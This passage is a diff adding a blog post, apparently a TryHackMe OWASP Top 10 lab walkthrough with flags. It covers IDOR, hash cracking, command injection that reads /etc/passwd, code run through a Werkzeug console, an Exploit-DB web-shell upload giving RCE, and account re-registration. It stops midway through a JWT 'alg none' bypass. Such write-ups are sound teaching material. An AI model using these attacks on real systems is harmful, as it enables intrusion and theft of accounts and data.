@@ -1,0 +1,676 @@
+<!doctype html>
+<html lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="shortcut icon" href="/images/favicon.png" />
+
+<title>[THM] OWASP Top 10 (2021)&nbsp;|&nbsp;Wook&#39;s blog</title>
+<meta
+  name="title"
+  content="[THM] OWASP Top 10 (2021)"
+/>
+<meta
+  name="description"
+  content="What is OWASP?
+The Open Web Application Security Project, or OWASP, is an international non-profit organization dedicated to web application security. One of OWASP&rsquo;s core principles is that all of their materials be freely available and easily accessible on their website, making it possible for anyone to improve their own web application security.
+What is OWASP Top 10?
+The OWASP Top 10 is a regularly-updated report outlining security concerns for web application security, focusing on the 10 most critical risks."
+/>
+<meta
+  name="keywords"
+  content="TryHackMe,"
+/>
+
+  <meta name="author" content="Wook Lee" />
+
+
+
+
+<meta property="og:url" content="http://localhost:1313/posts/thm-owasp-top-10/">
+  <meta property="og:site_name" content="Wook&#39;s blog">
+  <meta property="og:title" content="[THM] OWASP Top 10 (2021)">
+  <meta property="og:description" content="What is OWASP? The Open Web Application Security Project, or OWASP, is an international non-profit organization dedicated to web application security. One of OWASP’s core principles is that all of their materials be freely available and easily accessible on their website, making it possible for anyone to improve their own web application security.
+What is OWASP Top 10? The OWASP Top 10 is a regularly-updated report outlining security concerns for web application security, focusing on the 10 most critical risks.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-06-30T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-06-30T00:00:00+00:00">
+    <meta property="article:tag" content="TryHackMe">
+
+
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="[THM] OWASP Top 10 (2021)">
+  <meta name="twitter:description" content="What is OWASP? The Open Web Application Security Project, or OWASP, is an international non-profit organization dedicated to web application security. One of OWASP’s core principles is that all of their materials be freely available and easily accessible on their website, making it possible for anyone to improve their own web application security.
+What is OWASP Top 10? The OWASP Top 10 is a regularly-updated report outlining security concerns for web application security, focusing on the 10 most critical risks.">
+
+
+
+
+
+  <meta itemprop="name" content="[THM] OWASP Top 10 (2021)">
+  <meta itemprop="description" content="What is OWASP? The Open Web Application Security Project, or OWASP, is an international non-profit organization dedicated to web application security. One of OWASP’s core principles is that all of their materials be freely available and easily accessible on their website, making it possible for anyone to improve their own web application security.
+What is OWASP Top 10? The OWASP Top 10 is a regularly-updated report outlining security concerns for web application security, focusing on the 10 most critical risks.">
+  <meta itemprop="datePublished" content="2024-06-30T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2024-06-30T00:00:00+00:00">
+  <meta itemprop="wordCount" content="2535">
+  <meta itemprop="keywords" content="TryHackMe">
+<meta name="referrer" content="no-referrer-when-downgrade" />
+
+    
+    <link href="/simple.min.css" rel="stylesheet" />
+
+    
+    <link href="/style.min.css" rel="stylesheet" />
+
+    
+
+    
+</head>
+
+  <body>
+    <header>
+      <nav>
+  <a
+    href="/"
+    
+    >Home</a
+  >
+
+  <a
+    href="/posts/"
+    
+    >Posts</a
+  >
+
+
+  <a href="/index.xml">
+    <svg xmlns="http://www.w3.org/2000/svg" class="icon" viewBox="0 0 448 512">
+      
+      <path
+        d="M0 64C0 46.3 14.3 32 32 32c229.8 0 416 186.2 416 416c0 17.7-14.3 32-32 32s-32-14.3-32-32C384 253.6 226.4 96 32 96C14.3 96 0 81.7 0 64zM0 416a64 64 0 1 1 128 0A64 64 0 1 1 0 416zM32 160c159.1 0 288 128.9 288 288c0 17.7-14.3 32-32 32s-32-14.3-32-32c0-123.7-100.3-224-224-224c-17.7 0-32-14.3-32-32s14.3-32 32-32z"
+      />
+    </svg>
+    RSS
+  </a>
+
+</nav>
+
+<h1>[THM] OWASP Top 10 (2021)</h1>
+
+
+    </header>
+    <main>
+      
+  
+  
+  <content>
+    <h3 id="what-is-owasp">What is OWASP?</h3>
+<p>The <strong>Open Web Application Security Project, or OWASP</strong>, is an international non-profit organization dedicated to <strong>web application security</strong>. One of OWASP&rsquo;s core principles is that all of their materials be freely available and easily accessible on their website, making it possible for anyone to improve their own web application security.</p>
+<h3 id="what-is-owasp-top-10">What is OWASP Top 10?</h3>
+<p><strong>The OWASP Top 10</strong> is a regularly-updated report outlining security concerns for web application security, focusing on the 10 most critical risks.</p>
+<blockquote>
+<ol>
+<li>Broken Access Control</li>
+<li>Cryptographic Failures</li>
+<li>Injection</li>
+<li>Insecure Design</li>
+<li>Security Misconfiguration</li>
+<li>Vulnerable and Outdated Components</li>
+<li>Identification and Authentication Failures</li>
+<li>Software and Data Integrity Failures</li>
+<li>Security Logging &amp; Monitoring Failures</li>
+<li>Server-Side Request Forgery (SSRF)</li>
+</ol>
+</blockquote>
+<hr>
+<h3 id="1-broken-access-control">1. Broken Access Control</h3>
+<p>Websites usually have pages that are protected from regular visitors. For example, only the site&rsquo;s admin user should be able to access a page to manage other users. If a website visitor can access protected pages they are not meant to see, then the access controls are <em>broken</em>.</p>
+<h4 id="broken-access-control-idor-challenge">Broken Access Control (IDOR Challenge)</h4>
+<p><strong>IDOR</strong> or <strong>Insecure Direct Object Reference</strong> refers to an access control vulnerability where you can access resources you wouldn&rsquo;t normally be able to see. This occurs when the programmer exposes a <strong>Direct Object Reference</strong>, which is just an identifier that refers to specific objects within the server. By object, it can refer to a file, a user, a bank account in a banking application, or anything.</p>
+<br>
+<p>Deploy the machine and go to <code>http://MACHINE_IP</code> - login with the username <em>noot</em> and the password <em>test1234</em>.</p>
+<br>
+Look at other user's notes. What is the flag?
+
+
+
+
+
+
+<pre tabindex="0"><code>flag{fivefourthree}</code></pre>
+<p><img src="image.png#center" alt="alt text"></p>
+
+
+
+
+
+
+<pre tabindex="0"><code>http://10.10.255.211/note.php?note_id=0</code></pre>
+<p><img src="image-1.png#center" alt="alt text">
+changed the <strong>id</strong> in the url from 1 to 0 and revealed the flag.</p>
+<h3 id="2-cryptographic-failures">2. Cryptographic Failures</h3>
+<p>A <strong>cryptographic failure</strong> refers to any vulnerability arising from the misuse of cryptographic alogrithms for protecting sensitive information. Web applications require cryptography to provide confidentiality for their users at many levels.</p>
+<h4 id="cryptographic-failures-challenge">Cryptographic Failures (Challenge)</h4>
+<p>Have a look around the web app. The developer has left themselves a note indicating that there is sensitive data in a specific directory.</p>
+<p>What is the name of the mentioned directory?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>/assets</code></pre>
+<p><img src="image-2.png#center" alt="alt text"></p>
+<br>
+<p>Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>webapp.db</code></pre>
+<p><img src="image-3.png#center" alt="alt text"></p>
+<br>
+<p>Use the supporting material to access the sensitive data. What is the password hash of the admin user?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>6eea9b7ef19179a06954edd0f6c05ceb</code></pre>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Downloads<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└─$ ls
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>webapp.db
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Downloads<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>└─$ file webapp.db
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>webapp.db: SQLite 3.x database, last written using SQLite version 3022000, file counter 255, database pages 7, 1st free page 5, free pages 1, cookie 0x6, schema 4, UTF-8, version-valid-for <span style="color:#fab387">255</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Downloads<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>└─$ sqlite3 webapp.db
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>SQLite version 3.44.2 2023-11-24 11:41:44
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>Enter <span style="color:#a6e3a1">&#34;.help&#34;</span> <span style="color:#cba6f7">for</span> usage hints.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>sqlite&gt; .tables
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>sessions  users
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>sqlite&gt; PRAGMA table_info<span style="color:#89dceb;font-weight:bold">(</span>users<span style="color:#89dceb;font-weight:bold">)</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>0|userID|TEXT|1<span style="color:#89dceb;font-weight:bold">||</span><span style="color:#fab387">1</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>1|username|TEXT|1<span style="color:#89dceb;font-weight:bold">||</span><span style="color:#fab387">0</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>2|password|TEXT|1<span style="color:#89dceb;font-weight:bold">||</span><span style="color:#fab387">0</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>3|admin|INT|1<span style="color:#89dceb;font-weight:bold">||</span><span style="color:#fab387">0</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>sqlite&gt; SELECT * FROM users;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>4413096d9c933359b898b6202288a650|admin|6eea9b7ef19179a06954edd0f6c05ceb|<span style="color:#fab387">1</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>23023b67a32488588db1e28579ced7ec|Bob|ad0234829205b9033196ba818f7a872b|<span style="color:#fab387">1</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>4e8423b514eef575394ff78caed3254d|Alice|268b38ca7b84f44fa0a6cdc86e6301e0|<span style="color:#fab387">0</span></span></span></code></pre></div>
+<br>
+<p>Crack the hash.
+What is the admin&rsquo;s plaintext password?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>qwertyuiop</code></pre>
+<p><img src="image-4.png#center" alt="alt text"></p>
+<br>
+<p>Login as the admin. What is the flag?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}</code></pre>
+<p><img src="image-5.png#center" alt="alt text"></p>
+<br>
+<h3 id="3-injection">3. Injection</h3>
+<p>Injection flaws occur because the application interprets user-controlled input as commands or parameters.</p>
+<p>Some common examples:</p>
+<ul>
+<li><strong>SQL Injection</strong></li>
+<li><strong>Command Injection</strong></li>
+</ul>
+<p>The main defence for preventing injection attacks is ensuring that user-controlled input is not interpreted as queries or commands.</p>
+<ul>
+<li><strong>Allow list</strong>: checks input by comparing it to a list of safe inputs. If the input is marked as safe, then it is processed. Otherwise, it&rsquo;s rejected.</li>
+<li><strong>Stripping input</strong>: If the input contains dangerous characters, these are removed before processing.</li>
+</ul>
+<h4 id="command-injection">Command Injection</h4>
+<p>Command Injection occurs when server-side code in a web app makes a call to a function that interacts with the server&rsquo;s console directly. An Injection web vulnerability allows an attacker to take advantage of that call to execute operating system commands arbitrarily on the server.</p>
+<br>
+<p>What strange text file is in the website&rsquo;s root directory?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>drpepper.txt</code></pre>
+<p><img src="image-6.png#center" alt="alt text"></p>
+<br>
+<p>How many non-root/non-service/non-daemon users are there?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>0</code></pre>
+<p>In order to find users in Linux, we can use the following command: <code>cat /etc/passwd</code>.</p>
+<p><img src="image-7.png#center" alt="alt text"></p>
+<p>However, there are so many users in the output. We are only interested in <strong>non-root/non-service/non-daemon</strong> users.</p>
+<p>We need to remember that Linux-based systems have two types of users: <code>system</code> and <code>normal</code> users.</p>
+<ul>
+<li><code>system users</code> are entities created by the system to run non-interactive processes, the processes that run in the background and do not require human interaction.</li>
+<li><code>normal users</code> are human users created by root or another user with root privileges.</li>
+</ul>
+<p>Both system and normal users in Linux have a <code>Unique User ID (UID)</code> to identify them.</p>
+<ul>
+<li>System users have UIDs in the range from <code>0 (root user) to 999</code>.</li>
+<li>Normal users typically receive UIDs from <code>1000 onwards</code></li>
+</ul>
+<p>I researched further to understand <code>/etc/passwd</code> file fields.</p>
+<p><img src="image-8.png#center" alt="alt text"></p>
+<p>arrow #3 represents the UID. From the output of our commands <code>cat /etc/passwd</code>, I found only one user that has UID higher than 1000.
+That is, <code>nobody</code>. However, I learned that the user &rsquo;nobody&rsquo; is a reserved user created by the system. Therefore, the answer to the question is actually 0.</p>
+<p><img src="image-9.png#center" alt="alt text"></p>
+<br>
+<p>What user is this app running as?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>apache</code></pre>
+<p>In order to find the current user, we can run the following command: <code>$(whoami)</code>
+<img src="image-10.png#center" alt="alt text"></p>
+<br>
+<p>What is the user&rsquo;s shell set as?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>/sbin/nologin</code></pre>
+<p><code>$(cat /etc/passwd)</code> command we saw above shows that user apache&rsquo;s shell at the very bottom.</p>
+<p><img src="image-11.png#center" alt="alt text"></p>
+<br>
+<p>What version of Alpine Linux is running?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>3.16.0</code></pre>
+<p>The hint of the question tells us that the version can be found in <code>/etc/alpine-release</code>.</p>
+<p><img src="image-12.png#center" alt="alt text"></p>
+<br>
+<h3 id="4-insecure-design">4. Insecure Design</h3>
+<p>Insecure design refers to vulnerabilities that are inherent to the application&rsquo;s architecture. They are not vulnerabilities regarding bad implementations or configurations, but the idea behind the whole application (or part of it) is falwed from the start.</p>
+<br>
+<p>Navigate to http://10.10.118.28:85 and get into joseph&rsquo;s account. This application also has a design flaw in its password reset mechanism. Can you figure out the weakness in the proposed design and how to abuse it?</p>
+<p>Try to reset joseph&rsquo;s password. keep in mind the method used by the site to validate if you are indeed joseph.</p>
+<p>What is the value of the flag in joseph&rsquo;s account?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>THM{Not_3ven_c4tz_c0uld_sav3_U!}</code></pre>
+<p><img src="image-13.png#center" alt="alt text">
+<img src="image-14.png#center" alt="alt text"></p>
+<p>One of the security questions was very easy to guess, and there was no limit on password attempts, which is an insecure design.</p>
+<br>
+<h3 id="5-security-misconfiguration">5. Security Misconfiguration</h3>
+<p>Security Misconfigurations occur when security could have been appropriately configured but was not. Even if you download the latest up-to-date software, poor configurations could make your installation vulnerable.</p>
+<p>Security misconfigurations include:</p>
+<ul>
+<li>Poorly configured permissions on cloud services, like S3 buckets.</li>
+<li>Having unnecessary features enabled, like services, pages, accounts or privileges.</li>
+<li>Default accounts with unchanged passwords.</li>
+<li>Error messages that are overly detailed and allow attackers to find out more about the system.</li>
+<li>Not using HTTP security headers.</li>
+</ul>
+<br>
+<p>Navigate to http://10.10.118.28:86/console to access the Werkzeug console.</p>
+<p>Use the Werkzeug console to run the following Python code to execute the ls -l command on the server:
+<code>import os; print(os.popen(&quot;ls -l&quot;).read())</code></p>
+<p>What is the database file name (the one with the .db extension) in the current directory?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>todo.db</code></pre>
+<br>
+<p>Modify the code to read the contents of the <code>app.py</code> file, which contains the application&rsquo;s source code. What is the value of the <code>secret_flag</code> variable in the source code?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>THM{Just_a_tiny_misconfiguration}</code></pre>
+<p><img src="image-15.png#center" alt="alt text"></p>
+<br>
+<h3 id="6-vulnerable-and-outdated-components">6. Vulnerable and Outdated Components</h3>
+<p>Occasionally, you may find that the company/entity you&rsquo;re pen-testing is using a program with a well-known vulnerability.
+It requires very little work to exploit its vulnerability because the vulnerability is already well-known. If a company misses a single update for a program they use, it could be vulnerable to any number of attacks.</p>
+<p>Navigate to http://10.10.118.28:84 where you&rsquo;ll find a vulnerable application.
+All the information you need to exploit it can be found online.</p>
+<p>What is the content of the /opt/flag.txt file?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>THM{But_1ts_n0t_my_f4ult!}</code></pre>
+<p><img src="image-16.png#center" alt="alt text">
+At the very top, the website clearly specifies that the site is built with PHP, MYSQL (procedure functions), and Bootstrap.</p>
+<br>
+<p><img src="image-17.png#center" alt="alt text">
+I googled <code>procedure functions bootstrap exploit</code> and the first result directs to <code>Exploit-DB</code>, clearly indicating we may be onto something!</p>
+<br>
+<p><img src="image-18.png#center" alt="alt text">
+I downloaded the exploit and ran it</p>
+<br>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Downloads<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└─$ ls
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>47887.py  webapp.db
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Downloads<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>└─$ python 47887.py
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>usage: 47887.py <span style="color:#89dceb;font-weight:bold">[</span>-h<span style="color:#89dceb;font-weight:bold">]</span> url
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>47887.py: error: the following arguments are required: url
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Downloads<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>└─$ python 47887.py http://10.10.118.28:84
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>&gt; Attempting to upload PHP web shell...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>&gt; Verifying shell upload...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>&gt; Web shell uploaded to http://10.10.118.28:84/bootstrap/img/KJvupFii50.php
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>&gt; Example <span style="color:#89dceb">command</span> usage: http://10.10.118.28:84/bootstrap/img/KJvupFii50.php?cmd<span style="color:#89dceb;font-weight:bold">=</span>whoami
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>&gt; Do you wish to launch a shell here? <span style="color:#89dceb;font-weight:bold">(</span>y/n<span style="color:#89dceb;font-weight:bold">)</span>: y
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>RCE $ cat /opt/flag.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>THM<span style="color:#89dceb;font-weight:bold">{</span>But_1ts_n0t_my_f4ult!<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
+<br>
+<h3 id="7-identification-and-authentication-failures">7. Identification and Authentication Failures</h3>
+<p>Authentication and session management constitute core components of modern web applications.
+<em>Authentication</em> allows users to gain access to web applications by verifying their identities.
+The most common form of authentication is using a username and password.
+If a user enters correct credentials, the server would provide ther users&rsquo; browser with a session cookie. A <em>session cookie</em> is needed because web servers use HTTP(S) to communicate, which is stateless. Attaching session cookies means the server will know who is sending what data. The server can then keep track of user&rsquo;s actions.</p>
+<p>Some common flaws in authentication mechanisms:</p>
+<ul>
+<li>Brute force attacks</li>
+<li>Use of weak credentials</li>
+<li>Weak Session Cookies</li>
+</ul>
+<p>Some mitigation for broekn authentication mechanisms:</p>
+<ul>
+<li>Enforce a strong password policy</li>
+<li>Enforce an automatic lockout after a certain number of attempts</li>
+<li>Implement Multi-Factor Authentication</li>
+</ul>
+<p>Many times, what happens is that developers forget to sanitize the input given by the user in the code of their application. We will focus on a vulnerability that happens because of a developer&rsquo;s mistake but is very easy to exploit, <code>re-registration</code></p>
+<p>Go to http://10.10.118.28:8088 and try to register with <code>darren</code> as your username. You&rsquo;ll see that the user already exists, so try to register <code> darren</code> (whitespace at the start) instead, and you&rsquo;ll see that you are now logged in and can see the content present only in darren&rsquo;s account, which in our case, is the flag that you need to retrieve.</p>
+<br>
+<p>What is the flag that you found in darren&rsquo;s account?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>fe86079416a21a3c99937fea8874b667</code></pre>
+<p><img src="image-19.png#center" alt="alt text"></p>
+<br>
+<p>Now try to do the same trick and see if you can log in as <code>arthur</code></p>
+
+
+
+
+
+
+<pre tabindex="0"><code>d9ac0f7db4fda460ac3edeb75d75e16e</code></pre>
+<p><img src="image-20.png#center" alt="alt text"></p>
+<br>
+<h3 id="8-software-and-data-integrity-failures">8. Software and Data Integrity Failures</h3>
+<h4 id="what-is-integrity">What is Integrity?</h4>
+<p>When talking about integrity, we refer to the capacity we have to ascertain that a piece of data remains unmodified.
+Integrity is essential in cybersecurity as we care about maintaining important data free from unwanted or malicious modifications.
+A <code>hash</code> is generally mentioned as a solution for ensuring data integrity.</p>
+<br>
+<p>What is the SHA-256 hash of <code>https://code.jquery.com/jquery-1.12.4.min.js</code>?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=</code></pre>
+<p><img src="image-21.png#center" alt="alt text"></p>
+<p>When a user logs into an application, they will be assigned some sort of session token that will need to be saved on the browser. This token will be repeated on each subsequent request to identify who we are. These session token can come in many forms but are usually assigned via <code>cookies</code>.</p>
+<p>Cookies are key-value pairs that a web application will store on the user&rsquo;s browser and that will be automatically repeated on each request to the website that issued them. This could be a terrible idea security-wise because, cookies are stored on the user&rsquo;s browser, so if the user tampers with the cookie, they could potentially impersonate someone else. The application would suffer from a data integrity failure.</p>
+<p>One solution to this is use some integry mechanisms to guarantee that cookie hasn&rsquo;t been altered by the user. One popular option is <code>JSON Web Tokens (JWT)</code></p>
+<p>JWTs are very simple tokens that allow you to store key-value pairs on a token that provides integrity as part of the token. The idea is that you can generate tokens that you can give your users with the certainty that they won&rsquo;t be able to alter the key-value pairs and pass the integrity check.</p>
+<p><img src="image-24.png#center" alt="alt text">
+JWT token is formed of 3 parts: <code>Header</code>, <code>Payload</code> and <code>Signature</code>.</p>
+<p>A data integrity failure vulnerability was present on some libraries implementing JWTs a while ago. The vulnerable libraries allowed attackers to bypass the signature validation by changing the two following things in a JWT:</p>
+<ol>
+<li>Modify the header section of the token so that the <code>alg</code> header would contain the value <code>none</code>.</li>
+<li>Remove the signature part.</li>
+</ol>
+<p><img src="image-25.png#center" alt="alt text"></p>
+<br>
+<p>Try logging into the application as guest. What is guest&rsquo;s account password?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>guest</code></pre>
+<p><img src="image-22.png#center" alt="alt text"></p>
+<br>
+<p>If your login was successful, you should now have a JWT stored as a cookie in your browser. Press F12 to bring out the Developer Tools.</p>
+<p>What is the name of the website&rsquo;s cookie containing a JWT token?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>jwt-session</code></pre>
+<p><img src="image-23.png#center" alt="alt text"></p>
+<br>
+<p>Use the knowledge gained in this task to modify the JWT toekn so that the application thinks you are the user &ldquo;admin&rdquo;.</p>
+<p>What is the flag presented to the admin user?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>THM{Dont_take_cookies_from_strangers}</code></pre>
+<br>
+<p>original token: <code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzE5ODk1NzI0fQ.KY3A8a6eVrLrqFt606eVjfMLYLGTRtZAwthimwQO5Lo</code></p>
+<p>We learned that the JWT token is formed of 3 parts.</p>
+<ul>
+<li>Header: <code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</code></li>
